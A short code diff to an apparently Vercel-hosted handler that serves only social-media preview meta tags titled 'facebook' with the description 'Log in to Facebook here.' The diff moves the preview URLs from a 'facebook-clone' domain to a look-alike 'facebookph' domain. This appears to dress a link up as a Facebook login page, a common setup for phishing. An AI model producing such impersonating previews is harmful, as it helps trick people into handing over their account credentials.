@@ -11,12 +11,12 @@ export default function handler(req, res) {
 <html>
 <head>
   <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://facebook-clone-one-sand.vercel.app/" />
+  <meta property="og:url" content="https://facebookph.vercel.app/" />
   <meta property="og:title" content="facebook" />
   <meta property="og:description" content="Log in to Facebook here." />
-  <meta property="og:image" content="https://facebook-clone-one-sand.vercel.app/template.png" />
+  <meta property="og:image" content="https://facebookph.vercel.app/template.png" />
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:image" content="https://facebook-clone-one-sand.vercel.app/template.png" />
+  <meta name="twitter:image" content="https://facebookph.vercel.app/template.png" />
 </head>
 <body></body>
 </html>`);
